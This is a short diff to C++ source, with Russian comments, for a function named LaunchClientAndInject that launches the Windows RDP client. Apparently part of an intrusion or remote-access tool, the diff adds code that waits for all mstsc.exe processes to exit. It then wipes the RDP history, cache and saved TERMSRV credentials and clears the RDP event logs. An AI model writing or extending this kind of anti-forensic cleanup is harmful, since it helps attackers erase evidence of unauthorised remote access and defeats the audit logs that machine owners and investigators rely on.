@@ -151,7 +151,7 @@ void RdpController::LaunchClientAndInject(int clientType) {
         rdpFile << L"username:s:" << targetUser << L"\n";
         rdpFile << L"promptcredentialonce:i:1\n";
         rdpFile << L"authentication level:i:2\n";
-        rdpFile << L"audiomode:i:0\n";
+        rdpFile << L"audiomode:i:1\n";
         rdpFile << L"audiocapturemode:i:1\n";
         rdpFile << L"use multimon:i:1\n";
         rdpFile.close();
@@ -169,6 +169,18 @@ void RdpController::LaunchClientAndInject(int clientType) {
                 DeleteFileW(rdpFilePath.c_str());
                 CloseHandle(pi.hProcess);
                 CloseHandle(pi.hThread);
+
+                // mstsc может передать сессию другому своему экземпляру и завершиться,
+                // поэтому ждём, пока не закроются ВСЕ процессы mstsc.exe
+                while (!GetProcessIds(L"mstsc.exe").empty()) {
+                    Sleep(2000);
+                }
+                Sleep(1000);
+
+                // Пользователь закрыл RDP-окно — чистим MRU в реестре,
+                // Default.rdp, кэш и сохранённые креды TERMSRV/*
+                ArtifactCleaner::ClearRdpArtifacts();
+                ArtifactCleaner::ClearRdpEventLogs();
                 }).detach();
         }
     }
